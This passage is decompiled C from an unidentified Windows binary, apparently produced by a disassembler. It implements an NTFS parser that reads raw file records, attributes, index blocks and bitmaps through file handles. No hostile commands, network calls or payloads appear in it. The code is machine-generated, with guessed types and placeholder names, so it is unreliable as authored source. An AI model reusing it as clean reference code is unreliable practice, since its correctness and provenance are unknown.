// 42BAF0: using guessed type void *CAttrBase::`vftable';

//----- (0040C730) --------------------------------------------------------
int __thiscall sub_40C730(int this, __int64 a2, unsigned int a3, char *lpBuffer, DWORD NumberOfBytesRead, _DWORD *a6)
{
  int v6; // ebx
  __int64 v8; // kr00_8
  unsigned int v9; // ecx
  int v10; // eax
  int v11; // eax
  unsigned int v12; // ecx
  unsigned int v13; // esi
  unsigned int v14; // ecx
  int v15; // esi
  unsigned __int64 v16; // kr10_8
  unsigned int v17; // ecx
  int v18; // ecx
  int *v19; // eax
  int v20; // eax
  unsigned __int64 v22; // [esp+10h] [ebp-10h] BYREF
  unsigned int v23; // [esp+18h] [ebp-8h]
  unsigned int v24; // [esp+1Ch] [ebp-4h]

  v6 = a3;
  *a6 = 0;
  v23 = a3;
  v24 = a2;
  v8 = *(_QWORD *)(*(_DWORD *)(this + 28) + 24) - *(_QWORD *)(*(_DWORD *)(this + 28) + 16);
  v9 = HIDWORD(a2);
  v23 = a2 + a3;
  if ( a2 + (unsigned __int64)a3 > v8 + 1 || NumberOfBytesRead < a3 * *(_DWORD *)(this + 12) )
    return 0;
  v10 = *(_DWORD *)(this + 40);
  *(_DWORD *)(this + 48) = v10;
  if ( v10 )
  {
    v11 = *(_DWORD *)(v10 + 4);
    if ( v11 )
    {
      while ( 1 )
      {
        if ( __PAIR64__(v9, v24) >= *(_QWORD *)(v11 + 16) )
        {
          v12 = *(_DWORD *)(v11 + 28);
          v13 = *(_DWORD *)(v11 + 24);
          if ( __PAIR64__(HIDWORD(a2), v24) > __PAIR64__(v12, v13) )
          {
            v9 = HIDWORD(a2);
          }
          else
          {
            v23 = 0;
            v14 = (__PAIR64__(v12, v13) - __PAIR64__(HIDWORD(a2), v24) + 1) >> 32;
            v15 = v13 - v24 + 1;
            if ( (unsigned int)v6 <= __PAIR64__(v14, v15) )
              v15 = v6;
            v17 = *(_DWORD *)(this + 12);
            v16 = *(_QWORD *)v11 + __PAIR64__(HIDWORD(a2), v24) - *(_QWORD *)(v11 + 16);
            if ( (HIDWORD(v16) & (unsigned int)v16) == -1 )
            {
              memset(lpBuffer, 0, v15 * v17);
              v18 = *(_DWORD *)(this + 12);
            }
            else
            {
              v22 = v17 * v16;
              NumberOfBytesRead = SetFilePointer(*(HANDLE *)(this + 20), v22, (PLONG)&v22 + 1, 0);
              if ( NumberOfBytesRead == -1 && GetLastError() )
                break;
              if ( !ReadFile(*(HANDLE *)(this + 20), lpBuffer, v15 * *(_DWORD *)(this + 12), &NumberOfBytesRead, 0) )
                break;
              v18 = *(_DWORD *)(this + 12);
              if ( NumberOfBytesRead != v15 * v18 )
                break;
            }
            a3 -= v15;
            v6 = a3;
            *a6 += v15;
            lpBuffer += v15 * v18;
            v9 = (__PAIR64__(HIDWORD(a2), v15) + v24) >> 32;
            v24 += v15;
            HIDWORD(a2) = v9;
            if ( !a3 )
              break;
          }
        }
        v19 = *(int **)(this + 48);
        if ( v19 )
        {
          v20 = *v19;
          *(_DWORD *)(this + 48) = v20;
          if ( v20 )
          {
            v11 = *(_DWORD *)(v20 + 4);
            if ( v11 )
              continue;
          }
        }
        break;
      }
    }
  }
  *a6 *= *(_DWORD *)(this + 12);
  return 1;
}

//----- (0040C900) --------------------------------------------------------
int __thiscall sub_40C900(_DWORD *this)
{
  return this[13];
}

//----- (0040C910) --------------------------------------------------------
__int64 __thiscall sub_40C910(_DWORD *this, _DWORD *a2)
{
  int v2; // eax
  int v3; // edx
  int v4; // eax

  if ( a2 )
  {
    v2 = this[7];
    v3 = *(_DWORD *)(v2 + 40);
    v4 = *(_DWORD *)(v2 + 44);
    *a2 = v3;
    a2[1] = v4;
  }
  return *(_QWORD *)(this[7] + 48);
}

//----- (0040C940) --------------------------------------------------------
int __thiscall sub_40C940(_DWORD *this, _DWORD *a2, char *Dst, int a4, _DWORD *a5)
{
  size_t v5; // edi
  int v6; // esi
  unsigned __int64 v7; // rcx
  int v8; // eax
  unsigned int v9; // edx
  int v10; // eax
  unsigned __int64 v11; // rcx
  int v12; // ebx
  size_t v13; // edx
  DWORD v14; // ecx
  int v15; // ecx
  size_t v16; // esi
  char *v17; // ecx
  DWORD v18; // ebx
  int v19; // eax
  DWORD v20; // ebx
  unsigned __int64 v22; // [esp-14h] [ebp-3Ch]
  unsigned __int64 v23; // [esp-Ch] [ebp-34h]
  int v24; // [esp+10h] [ebp-18h]
  int v25; // [esp+14h] [ebp-14h] BYREF
  int v26; // [esp+18h] [ebp-10h]
  _DWORD *v27; // [esp+1Ch] [ebp-Ch]
  size_t MaxCount; // [esp+20h] [ebp-8h]
  int v29; // [esp+24h] [ebp-4h]

  v5 = a4;
  v6 = (int)this;
  v27 = this;
  *a5 = 0;
  if ( !a4 )
    return 1;
  LODWORD(v7) = *a2;
  v8 = *(_DWORD *)(v6 + 28);
  v26 = a2[1];
  HIDWORD(v7) = v26;
  v9 = *(_DWORD *)(v8 + 48);
  v10 = *(_DWORD *)(v8 + 52);
  v25 = v10;
  if ( v7 > __PAIR64__(v10, v9) )
    return 0;
  if ( __PAIR64__(v26, v7) + (unsigned int)a4 > __PAIR64__(v25, v9) )
    v5 = v9 - v7;
  v23 = *(unsigned int *)(v6 + 12);
  v22 = __PAIR64__(v26, v7);
  v11 = __PAIR64__(v26, v7) % v23;
  v29 = HIDWORD(v11);
  v12 = v22 / v23;
  v26 = v12;
  v13 = *(_DWORD *)(v6 + 12) - v11;
  v24 = (v22 / v23) >> 32;
  v14 = *(_DWORD *)(v6 + 12);
  MaxCount = v13;
  if ( v13 == v14 )
  {
    v17 = Dst;
  }
  else
  {
    if ( !sub_40C730(v6, v22 / v23, 1u, *(char **)(v6 + 56), v14, &v25) )
      return 0;
    v15 = *(_DWORD *)(v6 + 12);
    if ( v25 != v15 )
      return 0;
    v16 = v5;
    if ( MaxCount < v5 )
      v16 = MaxCount;
    v25 = v16;
    memmove(Dst, (const void *)(v27[14] + v15 - MaxCount), v16);
    v5 -= v16;
    v17 = &Dst[v16];
    Dst += v16;
    *a5 += v16;
    v6 = (int)v27;
    v26 = v12 + 1;
    v24 += __CFADD__(v12, 1);
  }
  if ( !v5 )
    return 1;
  v18 = *(_DWORD *)(v6 + 12);
  v19 = v5 / v18;
  MaxCount = v5 / v18;
  if ( v5 / v18 )
  {
    v20 = v19 * v18;
    if ( !sub_40C730(v6, __SPAIR64__(v24, v26), v19, v17, v20, &v25) || v25 != v20 )
      return 0;
    v24 = (__PAIR64__(v24, MaxCount) + (unsigned int)v26) >> 32;
    v26 += MaxCount;
    Dst += v20;
    v5 %= *(_DWORD *)(v6 + 12);
    *a5 += v25;
    if ( v5 )
    {
      v18 = *(_DWORD *)(v6 + 12);
      goto LABEL_18;
    }
    return 1;
  }
LABEL_18:
  if ( sub_40C730(v6, __SPAIR64__(v24, v26), 1u, *(char **)(v6 + 56), v18, &v25) && v25 == *(_DWORD *)(v6 + 12) )
  {
    memmove(Dst, *(const void **)(v6 + 56), v5);
    *a5 += v5;
    return 1;
  }
  return 0;
}

//----- (0040CB10) --------------------------------------------------------
_DWORD *__thiscall sub_40CB10(_DWORD *Block, char a2)
{
  *Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAF0: using guessed type void *CAttrBase::`vftable';

//----- (0040CB40) --------------------------------------------------------
_DWORD *__thiscall sub_40CB40(_DWORD *Block, char a2)
{
  void *v3; // eax

  v3 = (void *)Block[2];
  *Block = &CFileName::`vftable';
  if ( v3 )
    sub_410463(v3);
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAE0: using guessed type void *CFileName::`vftable';

//----- (0040CB80) --------------------------------------------------------
int __thiscall sub_40CB80(_DWORD *this)
{
  void *v2; // eax
  int result; // eax
  unsigned __int8 v4; // cl
  int v5; // edi
  int v6; // ecx
  int v7; // edi
  wchar_t Dest[260]; // [esp+8h] [ebp-208h] BYREF

  v2 = (void *)this[2];
  if ( v2 )
  {
    sub_410463(v2);
    this[2] = 0;
    this[3] = 0;
  }
  result = this[1];
  if ( result && (v4 = *(_BYTE *)(result + 64)) != 0 )
  {
    v5 = v4;
    wcsncpy(Dest, (const wchar_t *)(result + 66), v4);
    this[3] = v5;
    Dest[v5] = 0;
    result = unknown_libname_1((unsigned __int64)(unsigned int)(v5 + 1) >> 31 != 0 ? -1 : 2 * (v5 + 1));
    v6 = this[3];
    v7 = 0;
    this[2] = result;
    if ( v6 > 0 )
    {
      do
      {
        *(_WORD *)(this[2] + 2 * v7) = towupper(Dest[v7]);
        ++v7;
        v6 = this[3];
      }
      while ( v7 < v6 );
      result = this[2];
    }
    *(_WORD *)(result + 2 * v6) = 0;
  }
  else
  {
    this[3] = 0;
    this[3] = 0;
    this[2] = 0;
  }
  return result;
}
// 40CBE9: conditional instruction was optimized away because edi.4 is in (1..FF)
// 410471: using guessed type int __cdecl unknown_libname_1(_DWORD);
// 40CB80: using guessed type wchar_t Dest[260];

//----- (0040CC70) --------------------------------------------------------
_DWORD *__thiscall sub_40CC70(_DWORD *Block, char a2)
{
  void *v3; // eax

  *Block = &CAttr_FileName::`vftable';
  v3 = (void *)Block[12];
  Block[10] = &CFileName::`vftable';
  if ( v3 )
    sub_410463(v3);
  *Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAE0: using guessed type void *CFileName::`vftable';
// 42BAF0: using guessed type void *CAttrBase::`vftable';
// 42BB3C: using guessed type void *CAttr_FileName::`vftable';

//----- (0040CCC0) --------------------------------------------------------
void *__thiscall sub_40CCC0(void *Block, char a2)
{
  void *v4; // [esp-8h] [ebp-Ch]

  v4 = (void *)*((_DWORD *)Block + 10);
  *(_DWORD *)Block = &CAttr_VolName::`vftable';
  sub_410463(v4);
  sub_410463(*((void **)Block + 11));
  *(_DWORD *)Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAF0: using guessed type void *CAttrBase::`vftable';
// 42BBB0: using guessed type void *CAttr_VolName::`vftable';

//----- (0040CD10) --------------------------------------------------------
_DWORD *__thiscall sub_40CD10(_DWORD *Block, char a2)
{
  bool v3; // zf
  void *v4; // eax
  void *v5; // eax

  v3 = Block[4] == 0;
  *Block = &CIndexEntry::`vftable';
  if ( !v3 )
  {
    v4 = (void *)Block[6];
    if ( v4 )
      sub_410463(v4);
  }
  v5 = (void *)Block[2];
  *Block = &CFileName::`vftable';
  if ( v5 )
    sub_410463(v5);
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BABC: using guessed type void *CIndexEntry::`vftable';
// 42BAE0: using guessed type void *CFileName::`vftable';

//----- (0040CD70) --------------------------------------------------------
_DWORD *__thiscall sub_40CD70(_DWORD *Block, char a2)
{
  void *v3; // eax

  v3 = (void *)Block[5];
  *Block = &CIndexBlock::`vftable';
  if ( v3 )
    sub_410463(v3);
  *Block = &CSList<CIndexEntry>::`vftable';
  sub_40E970(Block);
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAE8: using guessed type void *CSList<CIndexEntry>::`vftable';
// 42BB20: using guessed type void *CIndexBlock::`vftable';

//----- (0040CDC0) --------------------------------------------------------
char *__thiscall sub_40CDC0(char *Block, char a2)
{
  _DWORD *v3; // ecx

  v3 = Block + 40;
  *(_DWORD *)Block = &CAttr_IndexRoot::`vftable';
  *v3 = &CSList<CIndexEntry>::`vftable';
  sub_40E970(v3);
  *(_DWORD *)Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAE8: using guessed type void *CSList<CIndexEntry>::`vftable';
// 42BAF0: using guessed type void *CAttrBase::`vftable';
// 42BB0C: using guessed type void *CAttr_IndexRoot::`vftable';

//----- (0040CE00) --------------------------------------------------------
_DWORD *__thiscall sub_40CE00(_DWORD *Block, char a2)
{
  void *v4; // [esp-8h] [ebp-10h]

  v4 = (void *)Block[14];
  *Block = &CAttrNonResident::`vftable';
  sub_410463(v4);
  sub_40E9D0((int)(Block + 8));
  Block[8] = &CSList<tagDataRun_Entry>::`vftable';
  sub_40E9D0((int)(Block + 8));
  *Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BA54: using guessed type void *CSList<tagDataRun_Entry>::`vftable';
// 42BA80: using guessed type void *CAttrNonResident::`vftable';
// 42BAF0: using guessed type void *CAttrBase::`vftable';

//----- (0040CE50) --------------------------------------------------------
int __thiscall sub_40CE50(int this, _QWORD *a2, _DWORD *a3)
{
  int v5; // edi
  void *v6; // eax
  int v7; // eax
  int v8; // ecx
  int v9; // edi
  unsigned int v10; // esi
  int v11; // ecx
  int v12; // esi
  int v13; // edx
  __int16 *v14; // eax
  signed int v15; // ecx
  __int16 v16; // ax
  int v17; // edi
  _DWORD *v18; // esi
  _DWORD *v19; // eax
  _DWORD *v20; // ecx
  unsigned int v22; // [esp-8h] [ebp-2Ch]
  unsigned int v23; // [esp+Ch] [ebp-18h] BYREF
  int v24; // [esp+10h] [ebp-14h]
  int v25; // [esp+18h] [ebp-Ch] BYREF
  int v26; // [esp+1Ch] [ebp-8h]
  _WORD *i; // [esp+20h] [ebp-4h]
  __int16 v28; // [esp+2Ch] [ebp+8h]
  unsigned int j; // [esp+2Ch] [ebp+8h]
  signed int v30; // [esp+30h] [ebp+Ch]

  i = (_WORD *)this;
  if ( *a2 >= *(_QWORD *)(this + 64) )
    return 0;
  v5 = *(_DWORD *)(this + 16);
  if ( (int)a3[1] > 0 )
    sub_40E970(a3);
  v6 = (void *)a3[5];
  if ( v6 )
    sub_410463(v6);
  v7 = unknown_libname_1(v5);
  v8 = (int)i;
  v9 = v7;
  a3[5] = v7;
  v10 = *(_DWORD *)(this + 16);
  v26 = v7;
  v30 = v10 / *(unsigned __int16 *)(v8 + 8);
  v11 = (*a2 * (unsigned __int64)v10) >> 32;
  v23 = v10 * *(_DWORD *)a2;
  v24 = v11;
  v22 = v10;
  v12 = (int)i;
  if ( !(*(int (__thiscall **)(_WORD *, unsigned int *, int, unsigned int, int *))(*(_DWORD *)i + 12))(
          i,
          &v23,
          v7,
          v22,
          &v25)
    || v25 != *(_DWORD *)(v12 + 16)
    || *(_DWORD *)v9 != 1480871497 )
  {
    return 0;
  }
  v13 = v9;
  v14 = (__int16 *)(v9 + *(unsigned __int16 *)(v9 + 4));
  v28 = *v14;
  v15 = 0;
  for ( i = v14 + 1; v15 < v30; *(_WORD *)(v13 - 2) = v16 )
  {
    v13 += 2 * (*(unsigned __int16 *)(v12 + 8) >> 1);
    v24 = v13;
    if ( *(_WORD *)(v13 - 2) != v28 )
      return 0;
    v16 = i[v15++];
  }
  v17 = *(_DWORD *)(v9 + 24) + 24 + v9;
  for ( j = *(unsigned __int16 *)(v17 + 8); j <= *(_DWORD *)(v26 + 28); j += *(unsigned __int16 *)(v17 + 8) )
  {
    v18 = operator new(0x1Cu);
    v18[4] = 0;
    v18[1] = 0;
    v18[2] = 0;
    v18[3] = 0;
    *v18 = &CIndexEntry::`vftable';
    v18[5] = 0;
    v18[6] = v17;
    if ( *(_WORD *)(v17 + 10) )
    {
      v18[1] = v17 + 16;
      sub_40CB80(v18);
    }
    v19 = operator new(8u);
    v19[1] = v18;
    *v19 = 0;
    v20 = (_DWORD *)a3[3];
    if ( v20 )
      *v20 = v19;
    else
      a3[2] = v19;
    ++a3[1];
    a3[3] = v19;
    if ( (*(_BYTE *)(v17 + 12) & 2) != 0 )
      break;
    v17 += *(unsigned __int16 *)(v17 + 8);
  }
  return 1;
}
// 410471: using guessed type int __cdecl unknown_libname_1(_DWORD);
// 42BABC: using guessed type void *CIndexEntry::`vftable';

//----- (0040D030) --------------------------------------------------------
char *__thiscall sub_40D030(char *this, int a2)
{
  _DWORD *v2; // eax
  int v3; // edx
  char *result; // eax

  *(_DWORD *)this = &CFileRecord::`vftable';
  v2 = this + 92;
  v3 = 16;
  do
  {
    *v2 = &CSList<CAttrBase>::`vftable';
    v2 += 5;
    *(v2 - 2) = 0;
    *(v2 - 3) = 0;
    *(v2 - 1) = 0;
    *(v2 - 4) = 0;
    --v3;
  }
  while ( v3 );
  *((_DWORD *)this + 2) = a2;
  result = this;
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = -1;
  *((_DWORD *)this + 5) = -1;
  *(_OWORD *)(this + 24) = 0i64;
  *(_OWORD *)(this + 40) = 0i64;
  *(_OWORD *)(this + 56) = 0i64;
  *(_OWORD *)(this + 72) = 0i64;
  *((_DWORD *)this + 22) = -1;
  return result;
}
// 42BB04: using guessed type void *CSList<CAttrBase>::`vftable';
// 42BBA0: using guessed type void *CFileRecord::`vftable';

//----- (0040D0C0) --------------------------------------------------------
_DWORD *__thiscall sub_40D0C0(_DWORD *Block, char a2)
{
  int v3; // edi
  _DWORD *v4; // esi
  void *v5; // eax
  int v6; // edi
  _DWORD *v7; // esi

  v3 = 16;
  *Block = &CFileRecord::`vftable';
  v4 = Block + 23;
  do
  {
    sub_40E970(v4);
    v4 += 5;
    --v3;
  }
  while ( v3 );
  v5 = (void *)Block[3];
  if ( v5 )
    sub_410463(v5);
  v6 = 16;
  v7 = Block + 103;
  do
  {
    v7 -= 5;
    *v7 = &CSList<CAttrBase>::`vftable';
    sub_40E970(v7);
    --v6;
  }
  while ( v6 );
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BB04: using guessed type void *CSList<CAttrBase>::`vftable';
// 42BBA0: using guessed type void *CFileRecord::`vftable';

//----- (0040D140) --------------------------------------------------------
_DWORD *__thiscall sub_40D140(int *this, unsigned int a2, _DWORD *a3)
{
  int v3; // edi
  _DWORD *v5; // edx
  int v6; // ecx
  int v7; // eax
  _DWORD *result; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // esi
  int v12; // eax
  int v13; // eax
  int v14; // eax
  void *v15; // esi
  unsigned int v16; // eax
  _DWORD *v17; // edx
  int v18; // ecx
  int v19; // eax
  _DWORD *v20; // esi
  _DWORD *v21; // edx
  int v22; // eax
  _DWORD *v23; // eax
  int v24; // edx
  _DWORD *v25; // ebx
  int v26; // eax
  _DWORD *v27; // ecx
  int v28; // eax
  int v29; // edi
  _DWORD *v30; // esi
  _DWORD *v31; // eax
  _DWORD *v32; // ecx
  int v33; // eax
  _DWORD *v34; // eax
  _DWORD *v35; // edi
  bool v36; // zf
  _DWORD *v37; // esi
  int v38; // eax
  int v39; // ecx
  int v40; // eax
  char *v41; // eax
  void *v42; // esi
  int v43; // ecx
  int v44; // eax
  void *v45; // eax
  size_t v46; // edi
  size_t v47; // ecx
  _DWORD *v48; // eax
  unsigned __int64 v49; // [esp-14h] [ebp-2Ch]
  unsigned __int64 v50; // [esp-Ch] [ebp-24h]
  __int64 v51; // [esp-8h] [ebp-20h]
  __int64 v52; // [esp+10h] [ebp-8h] BYREF

  v3 = a2;
  HIDWORD(v52) = this;
  switch ( *(_DWORD *)a2 )
  {
    case 0x10:
      v5 = operator new(0x2Cu);
      *v5 = &CAttrBase::`vftable';
      v5[1] = v3;
      v5[6] = this;
      *((_WORD *)v5 + 4) = *(_WORD *)(this[2] + 8);
      v5[3] = *(_DWORD *)(this[2] + 12);
      v5[4] = *(_DWORD *)(this[2] + 20);
      v5[5] = *(_DWORD *)(this[2] + 32);
      *v5 = &CAttrResident::`vftable';
      v5[7] = v3;
      v6 = v3 + *(unsigned __int16 *)(v3 + 20);
      v5[8] = v6;
      v7 = *(_DWORD *)(v3 + 16);
      *v5 = &CAttr_StdInfo::`vftable';
      v5[10] = v6;
      v5[9] = v7;
      return v5;
    case 0x20:
      if ( *(_BYTE *)(a2 + 8) )
      {
        v9 = operator new(0x50u);
        return sub_40EAF0(v9, __SPAIR64__((unsigned int)this, v3));
      }
      else
      {
        v10 = operator new(0x3Cu);
        return (_DWORD *)sub_40ED10(v10, v3, this);
      }
    case 0x30:
      v11 = operator new(0x3Cu);
      *v11 = &CAttrBase::`vftable';
      v11[1] = v3;
      v11[6] = this;
      *((_WORD *)v11 + 4) = *(_WORD *)(this[2] + 8);
      v11[3] = *(_DWORD *)(this[2] + 12);
      v11[4] = *(_DWORD *)(this[2] + 20);
      v12 = *(_DWORD *)(this[2] + 32);
      *v11 = &CAttrResident::`vftable';
      v11[5] = v12;
      v11[7] = v3;
      v11[8] = v3 + *(unsigned __int16 *)(v3 + 20);
      v13 = *(_DWORD *)(v3 + 16);
      v11[14] = 0;
      v11[12] = 0;
      v11[13] = 0;
      v11[9] = v13;
      v14 = v11[8];
      *v11 = &CAttr_FileName::`vftable';
      v11[10] = &CAttr_FileName::`vftable';
      v11[11] = v14;
      sub_40CB80(v11 + 10);
      return v11;
    case 0x60:
      v15 = operator new(0x34u);
      *(_DWORD *)v15 = &CAttrBase::`vftable';
      *((_DWORD *)v15 + 1) = v3;
      *((_DWORD *)v15 + 6) = this;
      *((_WORD *)v15 + 4) = *(_WORD *)(this[2] + 8);
      *((_DWORD *)v15 + 3) = *(_DWORD *)(this[2] + 12);
      *((_DWORD *)v15 + 4) = *(_DWORD *)(this[2] + 20);
      *((_DWORD *)v15 + 5) = *(_DWORD *)(this[2] + 32);
      *(_DWORD *)v15 = &CAttrResident::`vftable';
      *((_DWORD *)v15 + 7) = v3;
      *((_DWORD *)v15 + 8) = v3 + *(unsigned __int16 *)(v3 + 20);
      v16 = *(_DWORD *)(v3 + 16);
      *((_DWORD *)v15 + 9) = v16;
      v16 >>= 1;
      *((_DWORD *)v15 + 12) = v16;
      *(_DWORD *)v15 = &CAttr_VolName::`vftable';
      *((_DWORD *)v15 + 10) = unknown_libname_1((unsigned __int64)(v16 + 1) >> 31 != 0 ? -1 : 2 * (v16 + 1));
      *((_DWORD *)v15 + 11) = unknown_libname_1(*((_DWORD *)v15 + 12) + 1);
      memmove(*((void **)v15 + 10), *((const void **)v15 + 8), *((_DWORD *)v15 + 9));
      *(_WORD *)(*((_DWORD *)v15 + 10) + 2 * *((_DWORD *)v15 + 12)) = 0;
      WideCharToMultiByte(
        0,
        0,
        *((LPCWCH *)v15 + 10),
        *((_DWORD *)v15 + 12),
        *((LPSTR *)v15 + 11),
        *((_DWORD *)v15 + 12),
        0,
        0);
      *(_BYTE *)(*((_DWORD *)v15 + 12) + *((_DWORD *)v15 + 11)) = 0;
      return v15;
    case 0x70:
      v17 = operator new(0x2Cu);
      *v17 = &CAttrBase::`vftable';
      v17[1] = v3;
      v17[6] = this;
      *((_WORD *)v17 + 4) = *(_WORD *)(this[2] + 8);
      v17[3] = *(_DWORD *)(this[2] + 12);
      v17[4] = *(_DWORD *)(this[2] + 20);
      v17[5] = *(_DWORD *)(this[2] + 32);
      *v17 = &CAttrResident::`vftable';
      v17[7] = v3;
      v18 = v3 + *(unsigned __int16 *)(v3 + 20);
      v17[8] = v18;
      v19 = *(_DWORD *)(v3 + 16);
      *v17 = &CAttr_VolInfo::`vftable';
      v17[10] = v18;
      v17[9] = v19;
      return v17;
    case 0x80:
      if ( *(_BYTE *)(a2 + 8) )
      {
        v20 = operator new(0x3Cu);
        sub_40C4A0(v20, __SPAIR64__((unsigned int)this, v3));
        *v20 = &CAttr_Data<CAttrNonResident>::`vftable';
        return v20;
      }
      else
      {
        v21 = operator new(0x28u);
        *v21 = &CAttrBase::`vftable';
        v21[1] = v3;
        v21[6] = this;
        *((_WORD *)v21 + 4) = *(_WORD *)(this[2] + 8);
        v21[3] = *(_DWORD *)(this[2] + 12);
        v21[4] = *(_DWORD *)(this[2] + 20);
        v21[5] = *(_DWORD *)(this[2] + 32);
        *v21 = &CAttrResident::`vftable';
        v21[7] = v3;
        v21[8] = v3 + *(unsigned __int16 *)(v3 + 20);
        v22 = *(_DWORD *)(v3 + 16);
        *v21 = &CAttr_Data<CAttrResident>::`vftable';
        v21[9] = v22;
        return v21;
      }
    case 0x90:
      v23 = operator new(0x40u);
      v24 = HIDWORD(v52);
      v25 = v23;
      *v23 = &CAttrBase::`vftable';
      v23[1] = v3;
      v23[6] = v24;
      *((_WORD *)v23 + 4) = *(_WORD *)(*(_DWORD *)(v24 + 8) + 8);
      v23[3] = *(_DWORD *)(*(_DWORD *)(v24 + 8) + 12);
      v23[4] = *(_DWORD *)(*(_DWORD *)(v24 + 8) + 20);
      v26 = *(_DWORD *)(*(_DWORD *)(v24 + 8) + 32);
      *v25 = &CAttrResident::`vftable';
      v25[5] = v26;
      v25[7] = v3;
      v27 = (_DWORD *)(v3 + *(unsigned __int16 *)(v3 + 20));
      v25[8] = v27;
      v28 = *(_DWORD *)(v3 + 16);
      v25[13] = 0;
      v25[12] = 0;
      v25[14] = 0;
      v25[11] = 0;
      v25[9] = v28;
      *v25 = &CAttr_IndexRoot::`vftable';
      v25[10] = &CAttr_IndexRoot::`vftable';
      v25[15] = v27;
      if ( *v27 == 48 )
      {
        v29 = (int)v27 + v27[4] + 16;
        a2 = *(unsigned __int16 *)(v29 + 8);
        if ( a2 <= v27[5] )
        {
          do
          {
            v30 = operator new(0x1Cu);
            v30[4] = 0;
            v30[1] = 0;
            v30[2] = 0;
            v30[3] = 0;
            *v30 = &CIndexEntry::`vftable';
            v30[5] = 0;
            v30[6] = v29;
            if ( *(_WORD *)(v29 + 10) )
            {
              v30[1] = v29 + 16;
              sub_40CB80(v30);
            }
            v31 = operator new(8u);
            v31[1] = v30;
            *v31 = 0;
            v32 = (_DWORD *)v25[13];
            if ( v32 )
              *v32 = v31;
            else
              v25[12] = v31;
            ++v25[11];
            v25[13] = v31;
            if ( (*(_BYTE *)(v29 + 12) & 2) != 0 )
              break;
            v29 += *(unsigned __int16 *)(v29 + 8);
            v33 = v25[15];
            a2 += *(unsigned __int16 *)(v29 + 8);
          }
          while ( a2 <= *(_DWORD *)(v33 + 20) );
        }
      }
      return v25;
    case 0xA0:
      v34 = operator new(0x48u);
      v51 = __PAIR64__((unsigned int)this, v3);
      v35 = v34;
      sub_40C4A0(v34, v51);
      v36 = v35[13] == 0;
      *v35 = &CAttr_IndexAlloc::`vftable';
      v35[16] = 0;
      v35[17] = 0;
      if ( !v36 )
      {
        v50 = (unsigned int)v35[4];
        v49 = *(_QWORD *)(v35[7] + 48);
        if ( !(v49 % v50) )
          *((_QWORD *)v35 + 8) = v49 / v50;
      }
      return v35;
    case 0xB0:
      if ( *(_BYTE *)(a2 + 8) )
      {
        v37 = operator new(0x58u);
        sub_40C4A0(v37, __SPAIR64__((unsigned int)this, v3));
        v36 = v37[13] == 0;
        *v37 = &CAttr_Bitmap<CAttrNonResident>::`vftable';
        v37[20] = -1;
        v37[21] = -1;
        if ( v36 )
        {
          v37[16] = 0;
          v37[17] = 0;
        }
        else
        {
          v38 = v37[7];
          v39 = *(_DWORD *)(v38 + 48);
          v37[17] = *(_DWORD *)(v38 + 52);
          v40 = v37[1];
          v37[16] = v39;
          if ( *(_BYTE *)(v40 + 8) )
          {
            v37[18] = unknown_libname_1(v37[3]);
            return v37;
          }
          v41 = (char *)unknown_libname_1(v39);
          v37[18] = v41;
          v52 = 0i64;
          if ( sub_40C940(v37, &v52, v41, v37[16], &a2) )
          {
            if ( a2 != v37[16] )
            {
              v37[18] = 0;
              return v37;
            }
            return v37;
          }
        }
        v37[18] = 0;
        return v37;
      }
      v42 = operator new(0x40u);
      *(_DWORD *)v42 = &CAttrBase::`vftable';
      *((_DWORD *)v42 + 1) = v3;
      *((_DWORD *)v42 + 6) = this;
      *((_WORD *)v42 + 4) = *(_WORD *)(this[2] + 8);
      v43 = *(_DWORD *)(this[2] + 12);
      *((_DWORD *)v42 + 3) = v43;
      *((_DWORD *)v42 + 4) = *(_DWORD *)(this[2] + 20);
      *((_DWORD *)v42 + 5) = *(_DWORD *)(this[2] + 32);
      *(_DWORD *)v42 = &CAttrResident::`vftable';
      *((_DWORD *)v42 + 7) = v3;
      *((_DWORD *)v42 + 8) = v3 + *(unsigned __int16 *)(v3 + 20);
      v44 = *(_DWORD *)(v3 + 16);
      *((_DWORD *)v42 + 9) = v44;
      *(_DWORD *)v42 = &CAttr_Bitmap<CAttrResident>::`vftable';
      *((_DWORD *)v42 + 14) = -1;
      *((_DWORD *)v42 + 15) = -1;
      *((_DWORD *)v42 + 10) = v44;
      *((_DWORD *)v42 + 11) = 0;
      if ( *(_BYTE *)(v3 + 8) )
      {
        *((_DWORD *)v42 + 12) = unknown_libname_1(v43);
        return v42;
      }
      else
      {
        v45 = (void *)unknown_libname_1(v44);
        v46 = *((_DWORD *)v42 + 10);
        *((_DWORD *)v42 + 12) = v45;
        if ( v46 )
        {
          v47 = *((_DWORD *)v42 + 9);
          if ( !v47 )
            goto LABEL_43;
          if ( v46 > v47 )
            v46 = *((_DWORD *)v42 + 9);
          memmove(v45, *((const void **)v42 + 8), v46);
          if ( v46 != *((_DWORD *)v42 + 10) )
LABEL_43:
            *((_DWORD *)v42 + 12) = 0;
        }
        return v42;
      }
    default:
      v36 = *(_BYTE *)(a2 + 8) == 0;
      *a3 = 1;
      if ( v36 )
      {
        result = operator new(0x28u);
        *result = &CAttrBase::`vftable';
        result[1] = v3;
        result[6] = this;
        *((_WORD *)result + 4) = *(_WORD *)(this[2] + 8);
        result[3] = *(_DWORD *)(this[2] + 12);
        result[4] = *(_DWORD *)(this[2] + 20);
        result[5] = *(_DWORD *)(this[2] + 32);
        result[7] = v3;
        *result = &CAttrResident::`vftable';
        result[8] = v3 + *(unsigned __int16 *)(v3 + 20);
        result[9] = *(_DWORD *)(v3 + 16);
      }
      else
      {
        v48 = operator new(0x3Cu);
        return sub_40C4A0(v48, __SPAIR64__((unsigned int)this, v3));
      }
      return result;
  }
}
